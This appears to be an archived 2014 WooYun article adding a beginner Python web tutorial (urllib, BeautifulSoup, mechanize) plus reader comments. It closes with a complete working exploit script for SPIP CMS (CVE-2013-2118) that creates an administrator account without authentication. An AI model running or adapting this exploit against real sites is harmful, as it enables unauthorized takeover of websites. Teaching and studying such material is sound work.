@@ -1,0 +1,254 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Python教程WEB安全篇</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">lxj616</a> <span class="bull">·</span> <time title="2014/07/21 11:20" ui-time="" datetime="2014/07/21 11:20" class="published ng-binding ng-isolate-scope">2014/07/21 11:20</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>0x00 概述</h2><hr><p>本文从实例代码出发，讲解了Python在WEB安全分析中的作用，以最基础的示例向读者展示了Python如何解析、获取、以及处理各种类型的WEB页面 系统环境：kali + beautifulsoup + mechanize，由于不涉及底层驱动设计，文中的示例代码可以在任意平台使用，当然无论什么平台都要安装好所用的插件。</p><h2>0x01 利用python获取WEB页面</h2><hr><pre><code>#!bash
+Python 2.7.6 (default, Nov 10 2013, 19:24:24) [MSC v.1500 64 bit (AMD64)] on win32
+Type "copyright", "credits" or "license()" for more information.
+&gt;&gt;&gt; import urllib
+</code></pre><p>首先引入urllib以继续下面的分析</p><pre><code>#!python
+&gt;&gt;&gt; httpResponse = urllib.urlopen("http://www.baidu.com")
+</code></pre><p>以百度为例获取http响应</p><pre><code>#!python
+&gt;&gt;&gt; httpResponse.code
+200
+</code></pre><p>状态为200 OK</p><pre><code>#!python
+&gt;&gt;&gt; print httpResponse.read()[0:500]
+</code></pre><p>由于篇幅限制，只显示前500好啦</p><pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="content-type" content="text/html;charset=utf-8"&gt;&lt;meta http-equiv="X-UA-Compatible" content="IE=Edge"&gt;&lt;link rel="dns-prefetch" href="//s1.bdstatic.com"/&gt;&lt;link rel="dns-prefetch" href="//t1.baidu.com"/&gt;&lt;link rel="dns-prefetch" href="//t2.baidu.com"/&gt;&lt;link rel="dns-prefetch" href="//t3.baidu.com"/&gt;&lt;link rel="dns-prefetch" href="//t10.baidu.com"/&gt;&lt;link rel="dns-prefetch" href="//t11.baidu.com"/&gt;&lt;link rel="dns-prefetch" href="//t12.baidu.co
+</code></pre><p>看一下http响应的结构</p><pre><code>#!python
+&gt;&gt;&gt; dir(httpResponse) ['doc', 'init', 'iter', 'module', 'repr', 'close', 'code', 'fileno', 'fp', 'getcode', 'geturl', 'headers', 'info', 'next', 'read', 'readline', 'readlines', 'url']
+</code></pre><p>查看响应所对应的url</p><pre><code>#!python
+&gt;&gt;&gt; httpResponse.url
+'http://www.baidu.com'
+</code></pre><p>同理可查看headers结构的内部结构</p><pre><code>#!python
+&gt;&gt;&gt; dir(httpResponse.headers)
+['__contains__', '__delitem__', '__doc__', '__getitem__', '__init__', '__iter__', '__len__', '__module__', '__setitem__', '__str__', 'addcontinue', 'addheader', 'dict', 'encodingheader', 'fp', 'get', 'getaddr', 'getaddrlist', 'getallmatchingheaders', 'getdate', 'getdate_tz', 'getencoding', 'getfirstmatchingheader', 'getheader', 'getheaders', 'getmaintype', 'getparam', 'getparamnames', 'getplist', 'getrawheader', 'getsubtype', 'gettype', 'has_key', 'headers', 'iscomment', 'isheader', 'islast', 'items', 'keys', 'maintype', 'parseplist', 'parsetype', 'plist', 'plisttext', 'readheaders', 'rewindbody', 'seekable', 'setdefault', 'startofbody', 'startofheaders', 'status', 'subtype', 'type', 'typeheader', 'unixfrom', 'values']
+&gt;&gt;&gt; httpResponse.headers.items()
+[('bdqid', '0xeb89374a00028e2e'), ('x-powered-by', 'HPHP'), ('set-cookie', 'BAIDUID=0C926CCF670378EAAA0BD29C611B3AE8:FG=1; expires=Thu, 31-Dec-37 23:55:55 GMT; max-age=2147483647; path=/; domain=.baidu.com, BDSVRTM=0; path=/, H_PS_PSSID=5615_4392_1423_7650_7571_6996_7445_7539_6505_6018_7254_7607_7134_7666_7415_7572_7580_7475; path=/; domain=.baidu.com'), ('expires', 'Tue, 15 Jul 2014 02:37:00 GMT'), ('vary', 'Accept-Encoding'), ('bduserid', '0'), ('server', 'BWS/1.1'), ('connection', 'Close'), ('cxy_all', 'baidu+776b3a548a71afebd09c6640f9af5559'), ('cache-control', 'private'), ('date', 'Tue, 15 Jul 2014 02:37:47 GMT'), ('p3p', 'CP=" OTI DSP COR IVA OUR IND COM "'), ('content-type', 'text/html; charset=utf-8'), ('bdpagetype', '1')]
+</code></pre><p>试着简单解析一个</p><pre><code>#!python
+&gt;&gt;&gt; for header,value in httpResponse.headers.items() :
+    print header+':'+value    
+
+bdqid:0xeb89374a00028e2e
+x-powered-by:HPHP
+set-cookie:BAIDUID=0C926CCF670378EAAA0BD29C611B3AE8:FG=1; expires=Thu, 31-Dec-37 23:55:55 GMT; max-age=2147483647; path=/; domain=.baidu.com, BDSVRTM=0; path=/, H_PS_PSSID=5615_4392_1423_7650_7571_6996_7445_7539_6505_6018_7254_7607_7134_7666_7415_7572_7580_7475; path=/; domain=.baidu.com
+expires:Tue, 15 Jul 2014 02:37:00 GMT
+vary:Accept-Encoding
+bduserid:0
+server:BWS/1.1
+connection:Close
+cxy_all:baidu+776b3a548a71afebd09c6640f9af5559
+cache-control:private
+date:Tue, 15 Jul 2014 02:37:47 GMT
+p3p:CP=" OTI DSP COR IVA OUR IND COM "
+content-type:text/html; charset=utf-8
+bdpagetype:1
+
+&gt;&gt;&gt; url = http://www.baidu.com/s?wd=df&amp;rsv_spt=1
+</code></pre><p>完整的url用来获取http页面</p><pre><code>#!python
+&gt;&gt;&gt; base_url = http://www.baidu.com
+</code></pre><p>基础url</p><pre><code>#!python
+&gt;&gt;&gt; args = {'wd':'df','rsv_spt':1}
+</code></pre><p>传参单独构造</p><pre><code>#!python
+&gt;&gt;&gt; encode_args = urllib.urlencode(args)
+</code></pre><p>Urlencode可以编码url形式</p><pre><code>#!python
+&gt;&gt;&gt; fp2=urllib.urlopen(base_url+'/s?'+encode_args)
+</code></pre><p>重新尝试以这样的方式获取WEB页面</p><pre><code>#!python
+&gt;&gt;&gt; print fp2.read()[0:500].decode("utf-8")
+</code></pre><p>由于页面是utf-8的，因此解码中文自己设置</p><pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"&gt;&lt;meta http-equiv="content-type" content="text/html;charset=utf-8"&gt;&lt;title&gt;df_百度搜索&lt;/title&gt;&lt;style data-for="result" &gt;body{color:#333;background:#fff;padding:6px 0 0;margin:0;position:relative;min-width:900px}body,th,td,.p1,.p2{font-family:arial}p,form,ol,ul,li,dl,dt,dd,h3{margin:0;padding:0;list-style:none}input{padding-top:0;padding-bottom:0;-moz-box-sizing:border-box;-webkit-box-sizing
+&gt;&gt;&gt;
+</code></pre><h2>0x02 利用python解析html页面</h2><hr><p>首先安装beautifulsoup ，http://www.crummy.com/software/BeautifulSoup/</p><pre><code>#!bash
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="d6a4b9b9a296bdb7babf">[email&#160;protected]</a>:~/Desktop/beautifulsoup4-4.3.2# python setup.py install
+running install
+running build
+running build_py
+creating build/lib.linux-x86_64-2.7
+creating build/lib.linux-x86_64-2.7/bs4
+copying bs4/dammit.py -&gt; build/lib.linux-x86_64-2.7/bs4
+copying bs4/testing.py -&gt; build/lib.linux-x86_64-2.7/bs4
+copying bs4/element.py -&gt; build/lib.linux-x86_64-2.7/bs4
+copying bs4/__init__.py -&gt; build/lib.linux-x86_64-2.7/bs4
+…………………………………………………………部分省略
+copying bs4/diagnose.py -&gt; build/lib.linux-x86_64-2.7/bs4
+creating build/lib.linux-x86_64-2.7/bs4/builder
+copying bs4/builder/_lxml.py -&gt; build/lib.linux-x86_64-2.7/bs4/builder
+copying bs4/builder/_htmlparser.py -&gt; build/lib.linux-x86_64-2.7/bs4/builder
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="25574a4a51654e44494c">[email&#160;protected]</a>:~/Desktop/beautifulsoup4-4.3.2#
+</code></pre><p>下面就可以使用bs4了</p><pre><code>#!bash
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="8bf9e4e4ffcbe0eae7e2">[email&#160;protected]</a>:~# python
+Python 2.7.3 (default, Jan  2 2013, 13:56:14) 
+[GCC 4.7.2] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+&gt;&gt;&gt; from bs4 import BeautifulSoup
+</code></pre><p>导入bs4的包（之前安装过了）</p><pre><code>#!python
+&gt;&gt;&gt; import urllib
+&gt;&gt;&gt; html = urllib.urlopen('http://www.baidu.com')
+&gt;&gt;&gt; html.code
+200
+&gt;&gt;&gt; bt = BeautifulSoup(html.read(),"lxml")
+</code></pre><p>Lxml解析大概是kali自带的，windows下自己装比较麻烦</p><pre><code>#!python
+&gt;&gt;&gt; bt.title
+</code></pre><p>标题</p><pre><code>#!python
+&lt;title&gt;百度一下，你就知道&lt;/title&gt;
+&gt;&gt;&gt; bt.title.string
+u'\u767e\u5ea6\u4e00\u4e0b\uff0c\u4f60\u5c31\u77e5\u9053'
+&gt;&gt;&gt; bt.meta
+&lt;meta content="text/html;charset=utf-8" http-equiv="content-type"/&gt;
+&gt;&gt;&gt; bt.meta.next
+&lt;meta content="IE=Edge" http-equiv="X-UA-Compatible"/&gt;
+&gt;&gt;&gt; bt.meta.next.next
+&lt;link href="//s1.bdstatic.com" rel="dns-prefetch"/&gt;
+&gt;&gt;&gt; allMetaTags = bt.find_all('meta')
+</code></pre><p>找出所有的meta数据标签</p><pre><code>#!python
+&gt;&gt;&gt; allMetaTags
+[&lt;meta content="text/html;charset=utf-8" http-equiv="content-type"/&gt;, &lt;meta content="IE=Edge" http-equiv="X-UA-Compatible"/&gt;, &lt;meta content="0; url=/baidu.html?from=noscript" http-equiv="refresh"/&gt;]
+&gt;&gt;&gt; allMetaTags[0]
+&lt;meta content="text/html;charset=utf-8" http-equiv="content-type"/&gt;
+
+&gt;&gt;&gt; allLinks = bt.find_all('a')
+</code></pre><p>找出所有的a标签（链接）</p><pre><code>#!python
+&gt;&gt;&gt; allLinks[0]
+&lt;a href="http://www.baidu.com/gaoji/preferences.html" onmousedown="return user_c({'fm':'set','tab':'setting','login':'0'})"&gt;搜索设置&lt;/a&gt;
+&gt;&gt;&gt; allLinks[1]
+&lt;a href="/" id="btop" onmousedown="return user_c({'fm':'set','tab':'index','login':'0'})"&gt;百度首页&lt;/a&gt;
+
+&gt;&gt;&gt; for link in allLinks:
+...     print link['href']
+... 
+</code></pre><p>试着简单的解析一下</p><pre><code>http://www.baidu.com/gaoji/preferences.html
+https://passport.baidu.com/v2/?login&amp;tpl=mn&amp;u=http%3A%2F%2Fwww.baidu.com%2F
+https://passport.baidu.com/v2/?reg&amp;regType=1&amp;tpl=mn&amp;u=http%3A%2F%2Fwww.baidu.com%2F
+http://news.baidu.com/ns?cl=2&amp;rn=20&amp;tn=news&amp;word=
+http://tieba.baidu.com/f?kw=&amp;fr=wwwt
+http://zhidao.baidu.com/q?ct=17&amp;pn=0&amp;tn=ikaslist&amp;rn=10&amp;word=&amp;fr=wwwt
+http://music.baidu.com/search?fr=ps&amp;key=
+http://image.baidu.com/i?tn=baiduimage&amp;ps=1&amp;ct=201326592&amp;lm=-1&amp;cl=2&amp;nc=1&amp;word=
+http://v.baidu.com/v?ct=301989888&amp;rn=20&amp;pn=0&amp;db=0&amp;s=25&amp;word=
+http://map.baidu.com/m?word=&amp;fr=ps01000
+http://wenku.baidu.com/search?word=&amp;lm=0&amp;od=0
+</code></pre><h2>0x03 利用python+mechanize处理表单</h2><hr><pre><code>#!python
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="74061b1b00341f15181d">[email&#160;protected]</a>:~# python
+Python 2.7.3 (default, Jan  2 2013, 13:56:14) 
+[GCC 4.7.2] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+&gt;&gt;&gt; import mechanize
+</code></pre><p>导入mechanize</p><pre><code>#!python
+&gt;&gt;&gt; br = mechanize.Browser()
+</code></pre><p>构建一个浏览器实例</p><pre><code>#!python
+&gt;&gt;&gt; br.open('http://www.17173.com')
+</code></pre><p>打开一个有表单的页面</p><pre><code>#!python
+&lt;response_seek_wrapper at 0x248db90 whose wrapped object = &lt;closeable_response at 0x248d098 whose fp = &lt;socket._fileobject object at 0x1f868d0&gt;&gt;&gt;
+
+&gt;&gt;&gt; for form in br.forms():
+...     print form
+... 
+
+&lt;GET http://search.17173.com/jsp/news_press.jsp application/x-www-form-urlencoded
+  &lt;HiddenControl(charset=gbk) (readonly)&gt;
+  &lt;TextControl(keyword=��������)&gt;
+  &lt;SubmitControl(&lt;None&gt;=����) (readonly)&gt;&gt;
+&lt;searchask GET http://search.17173.com/jsp/game.jsp application/x-www-form-urlencoded
+  &lt;HiddenControl(charset=gbk) (readonly)&gt;
+  &lt;TextControl(&lt;None&gt;=)&gt;
+  &lt;TextControl(&lt;None&gt;=)&gt;&gt;
+&lt;voteform POST http://vote.17173.com/action/vote_process.php application/x-www-form-urlencoded
+  &lt;HiddenControl(vote_id=9624) (readonly)&gt;
+  &lt;HiddenControl(vote_year=) (readonly)&gt;
+  &lt;CheckboxControl(vote_item_9624[]=[49649, 49650, 49651, 49652, 49653, 49654, 49655, 49656])&gt;
+  &lt;SubmitControl(&lt;None&gt;=) (readonly)&gt;&gt;
+&lt;GET http://search.17173.com/jsp/news_press.jsp application/x-www-form-urlencoded
+  &lt;HiddenControl(charset=gbk) (readonly)&gt;
+  &lt;TextControl(keyword=��������)&gt;
+  &lt;SubmitControl(&lt;None&gt;=����) (readonly)&gt;&gt;
+&gt;&gt;&gt; 
+
+&gt;&gt;&gt; br.select_form(nr=0)
+</code></pre><p>选择要处理的表单</p><pre><code>#!python
+&gt;&gt;&gt; br.form['keyword']='2013'
+</code></pre><p>设置表单属性的值（TextControl）</p><pre><code>#!python
+&gt;&gt;&gt; br.submit()
+</code></pre><p>模拟浏览器提交表单</p><pre><code>#!python
+&lt;response_seek_wrapper at 0x248dab8 whose wrapped object = &lt;closeable_response at 0x249d950 whose fp = &lt;socket._fileobject object at 0x243e5d0&gt;&gt;&gt;
+&gt;&gt;&gt; br
+&lt;mechanize._mechanize.Browser instance at 0x242ff38&gt;
+&gt;&gt;&gt;
+</code></pre><h2>0x04 实例分析</h2><hr><p>以下是一个CMS的管理员密码能被越权找回漏洞，原作者信息均完整保留</p><pre><code>#!python
+#!/usr/bin/env python
+# Exploit Title: SPIP - CMS &lt; 3.0.9 / 2.1.22 / 2.0.23 - Privilege escalation to administrator account from non authenticated user
+# Date: 04/30/2014
+# Flaw finder : Unknown
+# Exploit Author: Gregory DRAPERI
+# Email: gregory |dot| draperi |at| gmail |dot| com
+# Google Dork : inurl="spip.php"
+# Vendor Homepage: www.spip.net
+# Software Link: http://files.spip.org/spip/archives/
+# Version: SPIP &lt; 3.0.9 / 2.1.22 / 2.0.23
+# Tested on: Windows 7 - SPIP 2.2.21
+# CVE : CVE-2013-2118
+'''
+---------------------------------------------------------------------------------------------------------
+Software Description:
+SPIP is a free software content management system
+---------------------------------------------------------------------------------------------------------
+Vulnerability Details:
+This vulnerability allows remote attackers to create an administrator account on the CMS without being authenticated.
+To exploit the flaw, a SMTP configuration has to be configured on SPIP because the password is sent by mail.
+
+'''
+import urllib, urllib2
+import cookielib
+import sys
+import re
+
+def send_request(urlOpener, url, post_data=None):
+//发送url（可选是否post）
+   request = urllib2.Request(url)
+//使用urllib2来处理http请求
+   url = urlOpener.open(request, post_data)
+   return url.read()
+
+if len(sys.argv) &lt; 4:
+//简单的系统提示
+   print "SPIP &lt; 3.0.9 / 2.1.22 / 2.0.23 exploit by Gregory DRAPERI\n\tUsage: python script.py &lt;SPIP base_url&gt; &lt;login&gt; &lt;mail&gt;"
+   exit()
+
+base_url = sys.argv[1]
+//网站地址
+login = sys.argv[2]
+//登陆地址
+mail = sys.argv[3]
+//越权发送邮件目的邮箱
+
+cookiejar = cookielib.CookieJar()
+//处理cookie以伪造身份
+urlOpener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookiejar))
+
+
+formulaire = send_request(urlOpener, base_url+"/spip.php?page=identifiants&amp;mode=0minirezo")
+print "[+] First request sended..."
+//发送HTTP请求
+
+
+m = re.search("&lt;input name='formulaire_action_args' type='hidden'\n[^&gt;]*", formulaire)
+
+//寻找目标表单
+
+m = re.search("(?&lt;=value=')[\w\+/=]*",m.group(0));
+
+
+formulaire_data = {'var_ajax' : 'form',
+                   'page' : 'identifiants',
+                   'mode' : '0minirezo',
+                   'formulaire_action' : 'inscription',
+                   'formulaire_action_args' : m.group(0),
+                   'nom_inscription' : login,
+                   'mail_inscription' : mail,
+                   'nobot' : ''
+                  }
+//构造请求中各参数
+formulaire_data = urllib.urlencode(formulaire_data)
+//进行url编码
+
+
+send_request(urlOpener, base_url+"/spip.php?page=identifiants&amp;mode=0minirezo", formulaire_data)
+print "[+] Second request sended"
+
+
+print "[+] You should receive an email with credentials soon :) "
+//第二次发送请求完毕后目标已经完成
+</code></pre><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">imlonghao</span> <span class="reply-time">2015-06-10 11:29:34</span></div><p></p><p>感觉像是 urllib 和 bs4 的用法简介而不是安全。。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">俄羅斯海關</span> <span class="reply-time">2014-10-07 21:55:37</span></div><p></p><p><strong>俄羅斯海關...</strong></p><p>Python教程WEB安全篇 | WooYun知识库...</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">louis vuitton designer inspired handbags</span> <span class="reply-time">2014-10-05 11:03:28</span></div><p></p><p><strong>louis vuitton designer inspired handbags...</strong></p><p>Python教程WEB安全篇 | WooYun知识库...</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">中国水泵</span> <span class="reply-time">2014-10-04 19:12:24</span></div><p></p><p><strong>中国水泵...</strong></p><p>Python教程WEB安全篇 | WooYun知识库...</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">whirlpool electric oven troubleshooting guide</span> <span class="reply-time">2014-09-16 00:09:52</span></div><p></p><p><strong>whirlpool electric oven troubleshooting guide...</strong></p><p>Python教程WEB安全篇 | WooYun知识库...</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">sigaretta elettronica prezzi e modelli</span> <span class="reply-time">2014-09-13 08:44:38</span></div><p></p><p><strong>sigaretta elettronica prezzi e modelli...</strong></p><p>Python教程WEB安全篇 | WooYun知识库...</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">lxj616</span> <span class="reply-time">2014-08-01 17:46:25</span></div><p></p><p>太感谢了，我一直在找类似ipython的python工具，这下写脚本方便多了！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Master</span> <span class="reply-time">2014-08-01 11:13:04</span></div><p></p><p>迭代器生成器看py高级编程，多看些peb神马的<br>like this http://dongweiming.github.io/Expert-Python/#5<br>另外用 ipython 吧，至少交互下代码补全是很爽的.</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">iskit</span> <span class="reply-time">2014-08-01 11:08:01</span></div><p></p><p>汉，着文章还必须登录才能看。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">咖啡</span> <span class="reply-time">2014-07-30 21:14:00</span></div><p></p><p>不错，菜鸟也能看懂！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">大大灰狼</span> <span class="reply-time">2014-07-29 12:53:48</span></div><p></p><p>很稀饭，希望楼主多发这样的文章</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">奎尼</span> <span class="reply-time">2014-07-26 08:54:45</span></div><p></p><p>改名叫 Python类库使用案例 比较好。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">打酱油的小男孩</span> <span class="reply-time">2014-07-23 12:07:47</span></div><p></p><p>&gt;&gt;&gt; import mechanize<br>Traceback (most recent call last):<br>File "", line 1, in<br>ImportError: No module named mechanize<br>&gt;&gt;&gt;<br>不是自带的模块唉。，感觉科普科普也挺好啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">lxj616</span> <span class="reply-time">2014-07-22 14:45:00</span></div><p></p><p>还会继续发的，是更有意思的话题，真的</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">动后河</span> <span class="reply-time">2014-07-21 20:40:44</span></div><p></p><p>可以来点python技巧<br>迭代器生成器之类的</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">cooFool</span> <span class="reply-time">2014-07-21 20:36:07</span></div><p></p><p>别啊。还是可以的，继续发吧。真的。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">0xev4l</span> <span class="reply-time">2014-07-21 18:59:55</span></div><p></p><p>挺好的，简单易懂，ls的都是大牛</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">lxj616</span> <span class="reply-time">2014-07-21 14:30:24</span></div><p></p><p>同感……之前本来还计划有两章，上周这第二篇写完觉得效果不好，于是就停掉了后面两篇<br>教程类型本身没有亮点，很难看的进去</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Manning</span> <span class="reply-time">2014-07-21 12:23:19</span></div><p></p><p>我觉得这种文章还是不要再有了...</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Chu</span> <span class="reply-time">2014-07-21 12:04:05</span></div><p></p><p>requests + lxml 足够了～</p><p></p></div></div></div></div></div></main>
